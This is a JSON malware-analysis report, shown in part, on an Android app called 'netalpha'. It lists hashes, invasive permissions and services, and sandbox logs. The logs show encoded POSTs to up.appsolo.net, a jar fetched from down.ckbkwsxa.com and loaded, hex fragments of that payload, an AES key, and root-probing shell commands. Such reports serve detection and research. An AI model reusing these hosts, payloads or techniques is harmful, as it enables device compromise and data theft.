@@ -1,0 +1,596 @@
+{
+    "apk_info": {
+        "id": "KByDd2jn7xXdY8mn",
+        "url": "https://developer.koodous.com/apks/2d4caa4a5e26e2cfdb217d9d41c206746b5ff0c0a095d7c2e4858f233d6625c3/",
+        "sha256": "2d4caa4a5e26e2cfdb217d9d41c206746b5ff0c0a095d7c2e4858f233d6625c3",
+        "md5": "0501a43155e1f7775b0abcea54d008c8",
+        "sha1": "e6315f07c9ac5f4b2227e80dc05fbe130364afac",
+        "app": "netalpha",
+        "package_name": "com.android.service.power.on",
+        "company": "Android",
+        "version": "3.1.9",
+        "image": null,
+        "size": 154538,
+        "tags": [],
+        "is_trusted": false,
+        "is_installed": true,
+        "rating": -9,
+        "is_detected": true,
+        "is_corrupted": false,
+        "last_scan": null,
+        "is_static_analyzed": true,
+        "is_dynamic_analyzed": true,
+        "is_false_positive": false,
+        "last_yara_analysis_at": null,
+        "matches_count": 1,
+        "comments_count": 0,
+        "votes_count": 9,
+        "created_at": "2016-11-11T15:05:13+01:00",
+        "updated_at": "2023-03-30T15:15:37.459923+02:00"
+    },
+    "static_analysis": {
+        "cuckoo": {
+            "target": {
+                "file": {
+                    "md5": "0501a43155e1f7775b0abcea54d008c8",
+                    "sha1": "e6315f07c9ac5f4b2227e80dc05fbe130364afac",
+                    "size": 154538,
+                    "crc32": "5BFA436D",
+                    "sha256": "2d4caa4a5e26e2cfdb217d9d41c206746b5ff0c0a095d7c2e4858f233d6625c3",
+                    "sha512": "94e5bd77aadf4c2cf93dbac18abaae47823963e562fc5f34d9657fcd9eb916cb65c6bfe914d252522d12b9ef585f52103d534d297d0eeb3d514a30b40b63e619",
+                    "ssdeep": "3072:rnpDDqszNybK/8xhFrZfY7NFUM3SsBKCUDITA+iXLpcOeibT0SRDiS62Ovr:bpr6K/ynfY7NFUMCqKk9iXLpki/0SRDa"
+                },
+                "category": "file"
+            },
+            "network": {
+                "dns": [
+                    {
+                        "type": "A",
+                        "answers": [],
+                        "request": "up.appsolo.net"
+                    },
+                    {
+                        "type": "A",
+                        "answers": [
+                            {
+                                "data": "52.74.240.149",
+                                "type": "A"
+                            }
+                        ],
+                        "request": "up.appsolo.net"
+                    },
+                    {
+                        "type": "A",
+                        "answers": [],
+                        "request": "down.ckbkwsxa.com"
+                    },
+                    {
+                        "type": "A",
+                        "answers": [
+                            {
+                                "data": "104.28.6.91",
+                                "type": "A"
+                            },
+                            {
+                                "data": "104.28.7.91",
+                                "type": "A"
+                            }
+                        ],
+                        "request": "down.ckbkwsxa.com"
+                    }
+                ],
+                "irc": [],
+                "http": [
+                    {
+                        "uri": "http://up.appsolo.net/gkview/up/2",
+                        "body": "",
+                        "data": "POST /gkview/up/2 HTTP/1.1\r\nContent-Length: 503\r\nHost: up.appsolo.net\r\nConnection: Keep-Alive\r\n\r\n",
+                        "host": "up.appsolo.net",
+                        "path": "/gkview/up/2",
+                        "port": 80,
+                        "method": "POST",
+                        "version": "1.1"
+                    },
+                    {
+                        "uri": "http://down.ckbkwsxa.com/testapk/is1108_1156.jar",
+                        "body": "",
+                        "data": "GET /testapk/is1108_1156.jar HTTP/1.1\r\nUser-Agent: Dalvik/1.6.0 (Linux; U; Android 4.1.1; SAMSUNG GT-I9100 Build/JRO03R)\r\nHost: down.ckbkwsxa.com\r\nConnection: Keep-Alive\r\nAccept-Encoding: gzip\r\n\r\n",
+                        "host": "down.ckbkwsxa.com",
+                        "path": "/testapk/is1108_1156.jar",
+                        "port": 80,
+                        "method": "GET",
+                        "version": "1.1",
+                        "user-agent": "Dalvik/1.6.0 (Linux; U; Android 4.1.1; SAMSUNG GT-I9100 Build/JRO03R)"
+                    }
+                ],
+                "smtp": [],
+                "hosts": [
+                    "52.74.240.149",
+                    "104.28.6.91"
+                ],
+                "domains": [
+                    {
+                        "ip": "52.74.240.149",
+                        "domain": "up.appsolo.net"
+                    },
+                    {
+                        "ip": "104.28.7.91",
+                        "domain": "down.ckbkwsxa.com"
+                    }
+                ]
+            }
+        },
+        "androguard": {
+            "urls": [],
+            "dexes": {
+                "classes": {
+                    "sha256": "26187a2b5cc3aa364e9db6d025e58d1e200b6c0bafb537c307040bba0b8e3cf2",
+                    "ssdeep": "96:r5r69Drw2WuFVNv7R5CayHHDRxUXInAMeaViI/z/yf7iq9sd+CVh:r5r6Gux7TCayDRUYhDVikk7ldC"
+                }
+            },
+            "api_key": {},
+            "cordova": "",
+            "filters": [
+                "android.intent.action.PACKAGE_REPLACED",
+                "android.intent.action.BMSG",
+                "android.intent.action.DELETE",
+                "android.intent.action.PACKAGE_ADDED",
+                "android.net.conn.CONNECTIVITY_CHANGE",
+                "android.intent.action.BOOT_COMPLETED",
+                "android.intent.action.AMSG",
+                "android.intent.action.MAIN",
+                "android.intent.action.USER_PRESENT",
+                "android.intent.action.PACKAGE_REMOVED"
+            ],
+            "app_name": "netalpha",
+            "services": [
+                "com.rain.dawn.flow.se.PlatformService",
+                "com.rain.dawn.flow.se.UJService",
+                "com.rain.dawn.flow.se.WService",
+                "com.rain.dawn.flow.se.BAService",
+                "com.rain.dawn.flow.se.DService",
+                "com.rain.dawn.flow.se.UJFRService"
+            ],
+            "wearable": false,
+            "androidtv": false,
+            "libraries": [],
+            "providers": [],
+            "receivers": [
+                "com.rain.dawn.cl.MDAReceiver",
+                "com.rain.dawn.cl.NWBReceiver",
+                "com.rain.dawn.cl.MPReceiver",
+                "com.rain.dawn.cl.IMReceiver"
+            ],
+            "activities": [
+                "com.android.service.power.on.WakeActivity"
+            ],
+            "certificate": {
+                "sha1": "E36625BC951C31F0A6EE2A7D78FF2D1AFF50A8E6",
+                "serial": "583513EB",
+                "issuerDN": "/C=US/O=Android/CN=Android Debug",
+                "not_after": "Oct 18 09:33:23 2116 GMT",
+                "subjectDN": "/C=US/O=Android/CN=Android Debug",
+                "not_before": "Nov 11 09:33:23 2016 GMT"
+            },
+            "permissions": [
+                "android.permission.DISABLE_KEYGUARD",
+                "android.permission.KILL_BACKGROUND_PROCESSES",
+                "com.android.launcher.permission.UNINSTALL_SHORTCUT",
+                "android.permission.READ_SECURE_SETTINGS",
+                "android.permission.BIND_ACCESSIBILITY_SERVICE",
+                "android.permission.ACCESS_WIFI_STATE",
+                "android.permission.INTERNET",
+                "android.intent.action.BOOT_COMPLETED",
+                "android.permission.WAKE_LOCK",
+                "android.permission.RECEIVE_USER_PRESENT",
+                "com.android.launcher.permission.INSTALL_SHORTCUT",
+                "android.permission.ACCESS_NETWORK_STATE",
+                "android.permission.GET_TASKS",
+                "android.permission.DELETE_PACKAGES",
+                "android.permission.READ_SETTINGS",
+                "android.permission.WRITE_EXTERNAL_STORAGE",
+                "android.permission.GET_PACKAGE_SIZE",
+                "android.permission.RECEIVE_BOOT_COMPLETED",
+                "android.permission.INSTALL_PACKAGES",
+                "android.permission.ACCESS_MTK_MMHW",
+                "android.permission.WRITE_SETTINGS",
+                "android.permission.READ_PHONE_STATE",
+                "android.permission.WRITE_SECURE_SETTINGS",
+                "android.permission.ACCESS_SUPERUSER",
+                "android.permission.SYSTEM_ALERT_WINDOW",
+                "android.permission.SYSTEM_OVERLAY_WINDOW",
+                "android.permission.CAMERA",
+                "android.permission.ACCESS_WAKE_LOCK",
+                "android.permission.ACCESS_DOWNLOAD_MANAGER",
+                "android.permission.PACKAGE_USAGE_STATS",
+                "com.android.permission.UNINSTALL_SHORTCUT",
+                "android.permission.GET_ACCOUNTS"
+            ],
+            "package_name": "com.android.service.power.on",
+            "version_code": "319",
+            "main_activity": "",
+            "signature_name": "META-INF/ANDROID.RSA",
+            "functionalities": {},
+            "max_sdk_version": "",
+            "min_sdk_version": "",
+            "new_permissions": [],
+            "displayed_version": "3.1.9",
+            "target_sdk_version": ""
+        }
+    },
+    "dynamic_analysis": {
+        "droidbox": {
+            "dns": [
+                {
+                    "ip": "52.74.240.149",
+                    "hostname": "up.appsolo.net"
+                },
+                {
+                    "ip": "104.28.6.91",
+                    "hostname": "down.ckbkwsxa.com"
+                }
+            ],
+            "recvnet": [
+                {
+                    "pid": 844,
+                    "tid": 705520584,
+                    "data": "432d4b5da88f8b52f3dcdef4ff00d66320e229ff40fa07b11d83d95f83d9df83719d367a97347abb30cff9af52f3036a9ebb9bfa25319f249c17e6f9fc26ea35eadfd4343ebf8fe27ec135eadfd4343ed75fcdfcaf51d3f89c7fb58867783cc3e3199ec6f03486a7313c87e1390ccf61f83c86cf63b8d12861f609ae51d3b86f10222ad35f997eb37f30881a22e2a9661f61b548a6ce65f80aea2bd4f3d48b8ce7e8fd00d38f433012ccbe405fea556a3dee17a4514384d9371844bd46adc7fd0433be87f0be6208fb7108c7fb10f6df108efb21ecb764d62385c73725e0ef2dccfec3606a3dee47a45107719fe22ab59ef4fbc3e937da5bc4d31f4f7f1afd69f4e7d09fc3f4f3e8f7abd9cfa8272b535beafd0b53cf548c5fa33e7d9d4d63781af7b3d2f89c274d7c16f09bfd8b97753d87f17c1d86f9cda819afca6f7435e385e876287b1a55d57738cb1b2e9e916f3a6a1fc4f4e308e63702772a464dbf8de0bcaaece12ee38fa7a6692da5f34de73c90cef37824db3992fe51b48f122575bea3442cb5a45ce356fb2cb1da3e9af1c730fe18514ac71bc379658c684835e93244031d2f83e9c6c2aefc63e9cf643d32e9cf62fbb3b07257f96461055ec7a5f6695aea78e3182f9bfd92cdf8d998c1ccfecd55aa99bfb359af6cce77d9bccfcf164f505706e2997d9ff9d4327abc8d673bc7b3dc09a291f64fa07f22cb9fc8",
+                    "time": 29.631797,
+                    "srchost": "down.ckbkwsxa.com",
+                    "srcport": 80,
+                    "processname": "com.android.service.power.on"
+                },
+                {
+                    "pid": 844,
+                    "tid": 705520584,
+                    "data": "HTTP/1.1 200 OK\r\nDate: Fri, 11 Nov 2016 14:17:14 GMT\r\nContent-Type: application/java-archive\r\nContent-Length: 75661\r\nConnection: keep-alive\r\nSet-Cookie: __cfduid=d2005a1b790c2210285567d5e592a3dc51478873834; expires=Sat, 11-Nov-17 14:17:14 GMT; path=/; domain=.ckbkwsxa.com; HttpOnly\r\nLast-Modified: Tue, 08 Nov 2016 05:41:57 GMT\r\nETag: \"582165a5-1278d\"\r\nCF-Cache-Status: HIT\r\nVary: Accept-Encoding\r\nExpires: Wed, 16 Nov 2016 14:17:14 GMT\r\nCache-Control: public, max-age=432000\r\nAccept-Ranges: bytes\r\nServer: clou\r\n\r\n64666c6172652d6e67696e780d0a43462d5241593a20333030323564646266333566323732302d4652410d0a0d0a504b0304140008080800766c68490000000000000000000000000b000000636c61737365732e646578acbd076054c5fec73b737637a1852c09cd08b80484a008a11a6a421545a4855e424202841212429112",
+                    "time": 27.252833,
+                    "srchost": "down.ckbkwsxa.com",
+                    "srcport": 80,
+                    "processname": "com.android.service.power.on"
+                },
+                {
+                    "pid": 844,
+                    "tid": 705520584,
+                    "data": "8a82a28020a0080a12044429010404441144ae08284d44012b2a36ac57e582e47d67e6bb9b49c8fabff7bd277ef29d99dff43367ce9c33677753d31e2c15dba889d8757648c86d9f1c7cadd9b8b8d5e76a7c3bf9b13b7fba72ec447fcf89638ec814423cd8bb7184e07f951176c82374f86829c4cc4a42bc0e8dad2ac4038e10651a0ab11ef669ed855886389bb28468dfc911f3670b51d1ed88cae056701b8806b54063d01af402e920073c02e681c5601d78159c01d7413e08f138a22e6808e2400b700fb80f7401dd4022e80352c17830094c05b3c032b01dbc018e839f403e708738a22408071541751003ee020dc1dda0356803ee077d4112c8040f8127c11ab00d1c051f81efc115900f9c5047940591e0165013d401f5400310075a80b6a003b81f7405e960347804f4e885f6804920073c0c1e014bc04ab00e6c001bc176b0171c02c7c15970115c023f821be096de8e6804ee0583413698061e028f82c7c1d36025580b5e063bc0abe03078177c003e03df817f831be0f63e38066010980636833de073f01b907dd16f603e380f6e80f87e383ee025b00bec01af8343e03d70167c0cae81b0fe8ef08228100dee021dc168b01cbc0dbe03ee018e080565404d301c8c0463c113e049b00cac00abc01ab01e6c04dbc02eb00f1c04c7c007e033e01988710c3a8091201b4c0373c13cb0102c01cf805520176c046f80",
+                    "time": 27.479343,
+                    "srchost": "down.ckbkwsxa.com",
+                    "srcport": 80,
+                    "processname": "com.android.service.power.on"
+                },
+                {
+                    "pid": 844,
+                    "tid": 705531112,
+                    "data": "HTTP/1.1 200 OK\r\nServer: Apache-Coyote/1.1\r\nContent-Type: application/json;charset=utf-8\r\nContent-Length: 361\r\nVary: Accept-Encoding\r\nDate: Fri, 11 Nov 2016 14:17:13 GMT\r\nConnection: close\r\n\r\nTEdMTESybQvscyUyHsUzBDU1BsU3BsUyHwIyYzHyTESyTEILTESyHtKyIzc5IEqzIDUyHsUyByUy\nHwikYv9fYW1vTESyTEILTESyaXHfawPyTESyTETNTESydXTnTESyTEILTESyaRC0cMUzBDUyCsUy\nCwCgd24fY2esa3dzoQOfY29eTETQdQVzdQPhayUyCwvzHEOhJP8iHEU2GwkrcsUyHsUyByUyHxZv\ncxIkb24vHtSvH0OvHtShGtUfHDUyHsUyByUyHxZvcxIkb25tb2CvTESyTEILIEOvI0BvIUBvHuHv\nHtTyZXI1bRBvHtSvH0OhTETNTESyc3CrdRVzTESyTEILHMU3CK==\n",
+                    "time": 27.054161,
+                    "srchost": "up.appsolo.net",
+                    "srcport": 80,
+                    "processname": "com.android.service.power.on"
+                }
+            ],
+            "sendnet": [
+                {
+                    "pid": 844,
+                    "tid": 705520584,
+                    "data": "GET /testapk/is1108_1156.jar HTTP/1.1\r\nUser-Agent: Dalvik/1.6.0 (Linux; U; Android 4.1.1; SAMSUNG GT-I9100 Build/JRO03R)\r\nHost: down.ckbkwsxa.com\r\nConnection: Keep-Alive\r\nAccept-Encoding: gzip\r\n\r\n",
+                    "time": 27.224152,
+                    "desthost": "down.ckbkwsxa.com",
+                    "destport": 80,
+                    "processname": "com.android.service.power.on"
+                },
+                {
+                    "pid": 844,
+                    "tid": 705531112,
+                    "data": "POST /gkview/up/2 HTTP/1.1\r\nContent-Length: 503\r\nHost: up.appsolo.net\r\nConnection: Keep-Alive\r\n\r\nTEdMTESyYW5ucw9kZP92ZXTzaW9fTESyTEILTESyIM4iGtOvHtSvHuHvHtTeb2CvbMUyHsUzBDUy\nHvILEVIVEucmC1BeDEuiHNKvHtSvHuHvHtTkc3I5cyUyHsUzBWZrbRIvTETNTESybQvscyUyHsUz\nBDU1BsU1CMUyByUyHwveZWuvHtSvH0OvHtSzIEcyINShINHyHzc1HEOvHtSvHuHvHtTha2cvHtSv\nH0OvHtTtb20fYW5ucw9kZM5zZXT2aWIvGxLgd2VyGw9fTESyTETNTESybWPtTESyTEILTESyTESy\nTETNTESybQPfZ3VrZ2UvHtSvH0OvHtTvbsUyHsUyByUyHwvec2uvHtSvH0OvHtSzHEKyItKhHNKh\nHNKhHNKvHtSvHuHvHtTnaWTpdsUyHsUzBDUyHtOhHDUyHsUyByUyHw5vdMUyHsUzBEHvHuHvHtTt\naQPfbwVnTESyTEILTESyaWIjYW5fZWhvHtSvI0B=\n",
+                    "time": 26.467941,
+                    "desthost": "up.appsolo.net",
+                    "destport": 80,
+                    "processname": "com.android.service.power.on"
+                }
+            ],
+            "sendsms": [],
+            "dexclass": [
+                {
+                    "pid": 844,
+                    "tid": 1073870640,
+                    "path": "/data/app/com.android.service.power.on-1.apk",
+                    "time": 0.012743,
+                    "processname": "com.android.service.power.on"
+                },
+                {
+                    "pid": 844,
+                    "tid": 1073870640,
+                    "path": "/data/data/com.android.service.power.on/cache/protect.apk",
+                    "time": 3.128788,
+                    "processname": "com.android.service.power.on"
+                },
+                {
+                    "pid": 844,
+                    "tid": 1073870640,
+                    "path": "/data/data/com.android.service.power.on/files/.androidsdata/is.jar",
+                    "time": 23.781445,
+                    "processname": "com.android.service.power.on"
+                },
+                {
+                    "pid": 885,
+                    "tid": 1073870640,
+                    "path": "/data/app/com.android.service.power.on-1.apk",
+                    "time": 59.018701,
+                    "processname": "com.android.service.power.on:daemon"
+                }
+            ],
+            "filesread": [
+                {
+                    "pid": 844,
+                    "tid": 1073870640,
+                    "data": "504b0304140008080800766c68490000000000000000000000000b000000636c61737365732e646578acbd076054c5fec73b737637a1852c09cd08b80484a008a11a6a421545a4855e4242028412124291128a82a28020a0080a12044429010404441144ae08284d44012b2a36ac57e582e47d67e6bb9b49c8fabff7bd277ef29d99dff43367ce9c33677753d31e2c15dba889d8757648c86d9f1c7cadd9b8b8d5e76a7c3bf9b13b7fba72ec447fcf89638ec814423cd8bb7184e07f951176c82374f86829c4cc4a42bc0e8dad2ac4038e10651a0ab11ef669ed855886389bb28468dfc911f3670b51d1ed88cae056701b8806b54063d01af402e920073c02e681c5601d78159c01d7413e08f138a22e6808e2400b700fb80f7401dd4022e80352c17830094c05b3c032b01dbc018e839f403e708738a22408071541751003ee020dc1dda0356803ee077d4112c8040f8127c11ab00d1c051f81efc115900f9c5047940591e0165013d401f5400310075a80b6a003b81f7405e960347804f4e885f6804920073c0c1e014bc04ab00e6c001bc176b0171c02c7c15970115c023f821be096de8e6804ee0583413698061e028f82c7c1d36025580b5e063bc0abe03078177c003e03df817f831be0f63e38066010980636833de073f01b907dd16f603e380f6e80f87e383ee025b00bec01af8343e03d70167c0cae81b0fe8ef082",
+                    "name": "/data/data/com.android.service.power.on/files/.androidsdata/is.jar",
+                    "time": 59.132939,
+                    "processname": "com.android.service.power.on"
+                },
+                {
+                    "pid": 844,
+                    "tid": 1073870640,
+                    "data": "504b0304140008080800cbb06a490000000000000000000000000b000000636c61737365732e646578a4bd076054c5fefe3db3250981c0922068045c8a10542084164a9026a2a0140352859004082524108a741411942aa0a82018290a4a510454248a88e045114414c486f55ad06bc582799fefccb3c92464bdf7f77fc54f9e99f94e3f73e6cc3967763723734a7462d3e6ea91e95d4fecdd77cd0d75fa7d71f34bf92bbf5e9cb7a053f3016ff8cf1cf4a81ca5d494becd6215ffab8bb057fcca848fd24a4dafa6d45e68dd1a4a75f328f57313a5d6c1debdb3522b11a77bae523f74f4a86fef54eaa0c7a30e817f81a3e03838093e03e780dfeb51978186a00568033a823e6004980b9e04dbc02e70069c055f816fc06fe00f7001289f47f94024a802ea82fae06ad0045c0f86816c3003ac05dbc04ef01c280007c131f01ef8009c055f8273e03fe02f10e5f7a84a2008924007d01ba48169600178183c02b681a7c13ebff4a1471d0627c029f021f8047c05be013f825fc05fa0105c16e151d5410be049457b407dd01034052d40277013e803fa818160181805f2c00c300f2c022bc01ab0151c069f82df41c53e1e55075c0392404bd01a740137815430006480116012980aee024bc1436003d80ade01bebe1e1503ae0183411658061e033b40f0568f6a0bee055bc1f7a0493f8fea0f86832c3016e48199601eb8076c",
+                    "name": "/data/data/com.android.service.power.on/files/.androidsdata/is.jar",
+                    "time": 13.93423,
+                    "processname": "com.android.service.power.on"
+                },
+                {
+                    "pid": 844,
+                    "tid": 1073870640,
+                    "data": "504b05060000000001000100390000007e6200000000504b01021403140000000800e98b6b490c74239b5562000008df00000b0000000000000000000000b68100000000636c61737365732e646578504b05060000000001000100390000007e6200000000",
+                    "name": "/data/data/com.android.service.power.on/cache/protect.apk",
+                    "time": 3.138946,
+                    "processname": "com.android.service.power.on"
+                },
+                {
+                    "pid": 844,
+                    "tid": 1073870640,
+                    "data": "504b0506000000000c000c0004030000905802000000504b010214001400080808002b8c6b4917298cc7a1010000c20200001400000000000000000000000000000000004d4554412d494e462f4d414e49464553542e4d46504b010214001400080808002c8c6b49373dde89df0100003b0300001300000000000000000000000000e30100004d4554412d494e462f414e44524f49442e5346504b010214001400080808002c8c6b494bd54f0b21040000b50400001400000000000000000000000000030400004d4554412d494e462f414e44524f49442e525341504b010214001400080808002b8c6b4972ba9c3f7e0a00006c300000130000000000000000000000000066080000416e64726f69644d616e69666573742e786d6c504b010214001400080808002a8c6b49a73699f36ba6000058fa00000d00000000000000000000000000251300006173736574732f6461656d6f6e504b01020a000a00000800002a8c6b49cc602d93c2260100c22601000d00000000000000000000000000cbb900006173736574732f69732e706e67504b010214001400080808002a8c6b49bf7ec8e5040b0000401500000b00000000000000000000000000bae00100636c61737365732e646578504b01020a000a00000800002b8c6b49733fb4dccd620000cd6200001300000000000000000000000000f7eb01007265732f726177",
+                    "name": "/data/app/com.android.service.power.on-1.apk",
+                    "time": 0.077773,
+                    "processname": "com.android.service.power.on"
+                },
+                {
+                    "pid": 844,
+                    "tid": 1073870640,
+                    "data": "7766147d909e69b799f9087fd3f7792c6b1cab12defdde284c552a98befcef7ef4bf8ef8e8d41e235ffc122b17829b24929eda5f7dbcf77bf4c619831423cd90",
+                    "name": "/data/data/com.android.service.power.on/files/.androidsdata/libc.dat",
+                    "time": 59.039217,
+                    "processname": "com.android.service.power.on"
+                },
+                {
+                    "pid": 844,
+                    "tid": 705520584,
+                    "data": "504b0304140008080800766c68490000000000000000000000000b000000636c61737365732e646578acbd076054c5fec73b737637a1852c09cd08b80484a008a11a6a421545a4855e4242028412124291128a82a28020a0080a12044429010404441144ae08284d44012b2a36ac57e582e47d67e6bb9b49c8fabff7bd277ef29d99dff43367ce9c33677753d31e2c15dba889d8757648c86d9f1c7cadd9b8b8d5e76a7c3bf9b13b7fba72ec447fcf89638ec814423cd8bb7184e07f951176c82374f86829c4cc4a42bc0e8dad2ac4038e10651a0ab11ef669ed855886389bb28468dfc911f3670b51d1ed88cae056701b8806b54063d01af402e920073c02e681c5601d78159c01d7413e08f138a22e6808e2400b700fb80f7401dd4022e80352c17830094c05b3c032b01dbc018e839f403e708738a22408071541751003ee020dc1dda0356803ee077d4112c8040f8127c11ab00d1c051f81efc115900f9c5047940591e0165013d401f5400310075a80b6a003b81f7405e960347804f4e885f6804920073c0c1e014bc04ab00e6c001bc176b0171c02c7c15970115c023f821be096de8e6804ee0583413698061e028f82c7c1d36025580b5e063bc0abe03078177c003e03df817f831be0f63e38066010980636833de073f01b907dd16f603e380f6e80f87e383ee025b00bec01af8343e03d70167c0cae81b0fe8ef082",
+                    "name": "/data/data/com.android.service.power.on/files/.androidsdata/270797269",
+                    "time": 48.318778,
+                    "processname": "com.android.service.power.on"
+                },
+                {
+                    "pid": 885,
+                    "tid": 1073870640,
+                    "data": "504b0506000000000c000c0004030000905802000000504b010214001400080808002b8c6b4917298cc7a1010000c20200001400000000000000000000000000000000004d4554412d494e462f4d414e49464553542e4d46504b010214001400080808002c8c6b49373dde89df0100003b0300001300000000000000000000000000e30100004d4554412d494e462f414e44524f49442e5346504b010214001400080808002c8c6b494bd54f0b21040000b50400001400000000000000000000000000030400004d4554412d494e462f414e44524f49442e525341504b010214001400080808002b8c6b4972ba9c3f7e0a00006c300000130000000000000000000000000066080000416e64726f69644d616e69666573742e786d6c504b010214001400080808002a8c6b49a73699f36ba6000058fa00000d00000000000000000000000000251300006173736574732f6461656d6f6e504b01020a000a00000800002a8c6b49cc602d93c2260100c22601000d00000000000000000000000000cbb900006173736574732f69732e706e67504b010214001400080808002a8c6b49bf7ec8e5040b0000401500000b00000000000000000000000000bae00100636c61737365732e646578504b01020a000a00000800002b8c6b49733fb4dccd620000cd6200001300000000000000000000000000f7eb01007265732f726177",
+                    "name": "/data/app/com.android.service.power.on-1.apk",
+                    "time": 59.0513,
+                    "processname": "com.android.service.power.on:daemon"
+                },
+                {
+                    "pid": 844,
+                    "tid": 1073870640,
+                    "data": "504b0506000000000100010039000000732601000000504b01021400140008080800cbb06a49e95b7e323a260100dcc602000b0000000000000000000000000000000000636c61737365732e646578504b0506000000000100010039000000732601000000",
+                    "name": "/data/data/com.android.service.power.on/files/.androidsdata/is.jar",
+                    "time": 23.798284,
+                    "processname": "com.android.service.power.on"
+                }
+            ],
+            "libraries": [],
+            "phonecalls": [],
+            "cryptousage": [
+                {
+                    "key": "60, -10, -95, 68, -101, -85, 109, 123, 105, 73, -20, 14, 59, -13, -59, -119",
+                    "pid": 844,
+                    "tid": 705520584,
+                    "time": 48.27571,
+                    "algorithm": "AES",
+                    "processname": "com.android.service.power.on"
+                },
+                {
+                    "key": "60, -10, -95, 68, -101, -85, 109, 123, 105, 73, -20, 14, 59, -13, -59, -119",
+                    "pid": 844,
+                    "tid": 705520584,
+                    "time": 48.286501,
+                    "algorithm": "AES",
+                    "processname": "com.android.service.power.on"
+                },
+                {
+                    "key": "60, -10, -95, 68, -101, -85, 109, 123, 105, 73, -20, 14, 59, -13, -59, -119",
+                    "pid": 844,
+                    "tid": 705520584,
+                    "time": 58.540864,
+                    "algorithm": "AES",
+                    "processname": "com.android.service.power.on"
+                },
+                {
+                    "key": "60, -10, -95, 68, -101, -85, 109, 123, 105, 73, -20, 14, 59, -13, -59, -119",
+                    "pid": 844,
+                    "tid": 705520584,
+                    "time": 58.549246,
+                    "algorithm": "AES",
+                    "processname": "com.android.service.power.on"
+                },
+                {
+                    "key": "60, -10, -95, 68, -101, -85, 109, 123, 105, 73, -20, 14, 59, -13, -59, -119",
+                    "pid": 844,
+                    "tid": 1073870640,
+                    "time": 59.059389,
+                    "algorithm": "AES",
+                    "processname": "com.android.service.power.on"
+                },
+                {
+                    "key": "60, -10, -95, 68, -101, -85, 109, 123, 105, 73, -20, 14, 59, -13, -59, -119",
+                    "pid": 844,
+                    "tid": 1073870640,
+                    "time": 59.073365,
+                    "algorithm": "AES",
+                    "processname": "com.android.service.power.on"
+                }
+            ],
+            "fileswritten": [
+                {
+                    "pid": 844,
+                    "tid": 705548128,
+                    "data": "ls -l /system/xbin/.ld.js\nexit\n",
+                    "name": "pipe:[2807]",
+                    "time": 24.986071,
+                    "processname": "com.android.service.power.on"
+                },
+                {
+                    "pid": 844,
+                    "tid": 705548128,
+                    "data": "ls -l /system/xbin/.ld.js\nexit\n",
+                    "name": "pipe:[2825]",
+                    "time": 25.638491,
+                    "processname": "com.android.service.power.on"
+                },
+                {
+                    "pid": 844,
+                    "tid": 1073870640,
+                    "data": "<?xml version='1.0' encoding='utf-8' standalone='yes' ?>\n<map>\n<int name=\"my_screen_width\" value=\"320\" />\n</map>\n",
+                    "name": "/data/data/com.android.service.power.on/shared_prefs/com.android.service.power.on_preferences.xml",
+                    "time": 24.602628,
+                    "processname": "com.android.service.power.on"
+                },
+                {
+                    "pid": 844,
+                    "tid": 1073870640,
+                    "data": "4cff6d6cc710f6d710f6f7105ca7ad5ea3ad5ea9ec73fdf3d4bf8bd43e57b7f51bca7c86e2bcb0cfdfb750ffa0fe45cde0f3f978be1ff883fa173583cfedd732ff3fa87f5133f83c7fad4aa13d85e1290c4f67783ac3d3193e8de1d3183e8de10b18be80e156e3957d1ff0073583ef07225455faabd26fdf130ca646a814aa7d5fb0560da1ce63f82aea0eea69ea19c6b3ef0be2cd7a298dfd9a869162df03f4a39ea736e4fb810c6a84b2ef090653ffa036e4fb033bded3b85e4f637fa671fca7b11fd3781ea4b1ff86b11ee93cdee945febecabe6fb88dda90ef1f32a883f95ee23cb5a10ef963e8b7da57a5d09f427f3afde9f44fa37f1ad32fa03fa4f6fd45435d95dadabcafb0f5ccc478b61a34d7dde10c1f5ef49ee209ea47457efbbee20953cf113c7f4760beb36ac7aff8adae65bc08d30eb1a753a5be2359de48b54abfe491f71eb61fb3985f16ef63b3d86f599c67c51ee3b5fe146abad16893ef28ce0ba3785e8f663b47d33f86f6312acae43b4635a646e9753e79afd2d8d8c7327e36e367ab72265e36e7996cd5846ad38d538926de38a6cb815dfc39f4e7b21eb9f48f67fbc7ab0aa69de3b142afef95f7326d4cbc098c97c77ec963fc3ccc78f67dcd79aa9dcff358af3cce7f79bc7fce5363a98ba96b8ae2dbf73d0ba9e5cdb89bc8f64e64f9935492f14fa27f32eb3199c765329fe389daf73e01137f0a",
+                    "name": "/data/data/com.android.service.power.on/files/.androidsdata/is.jar",
+                    "time": 4.853359,
+                    "processname": "com.android.service.power.on"
+                },
+                {
+                    "pid": 844,
+                    "tid": 705548128,
+                    "data": "ls -l /system/xbin/.ls\nexit\n",
+                    "name": "pipe:[2829]",
+                    "time": 25.772507,
+                    "processname": "com.android.service.power.on"
+                },
+                {
+                    "pid": 844,
+                    "tid": 1073870640,
+                    "data": "504b0304140008080800cbb06a490000000000000000000000000b000000636c61737365732e646578a4bd076054c5fefe3db3250981c0922068045c8a10542084164a9026a2a0140352859004082524108a741411942aa0a82018290a4a510454248a88e045114414c486f55ad06bc582799fefccb3c92464bdf7f77fc54f9e99f94e3f73e6cc3967763723734a7462d3e6ea91e95d4fecdd77cd0d75fa7d71f34bf92bbf5e9cb7a053f3016ff8cf1cf4a81ca5d494becd6215ffab8bb057fcca848fd24a4dafa6d45e68dd1a4a75f328f57313a5d6c1debdb3522b11a77bae523f74f4a86fef54eaa0c7a30e817f81a3e03838093e03e780dfeb51978186a00568033a823e6004980b9e04dbc02e70069c055f816fc06fe00f7001289f47f94024a802ea82fae06ad0045c0f86816c3003ac05dbc04ef01c280007c131f01ef8009c055f8273e03fe02f10e5f7a84a2008924007d01ba48169600178183c02b681a7c13ebff4a1471d0627c029f021f8047c05be013f825fc05fa0105c16e151d5410be049457b407dd01034052d40277013e803fa818160181805f2c00c300f2c022bc01ab0151c069f82df41c53e1e55075c0392404bd01a740137815430006480116012980aee024bc1436003d80ade01bebe1e1503ae0183411658061e033b40f0568f6a0bee055bc1f7a0493f8fea0f86832c3016e48199601eb8076c",
+                    "name": "/data/data/com.android.service.power.on/files/.androidsdata/is.jar",
+                    "time": 3.665628,
+                    "processname": "com.android.service.power.on"
+                },
+                {
+                    "pid": 844,
+                    "tid": 1073870640,
+                    "data": "<?xml version='1.0' encoding='utf-8' standalone='yes' ?>\n<map>\n<int name=\"my_screen_height\" value=\"480\" />\n<int name=\"my_screen_width\" value=\"320\" />\n</map>\n",
+                    "name": "/data/data/com.android.service.power.on/shared_prefs/com.android.service.power.on_preferences.xml",
+                    "time": 24.626354,
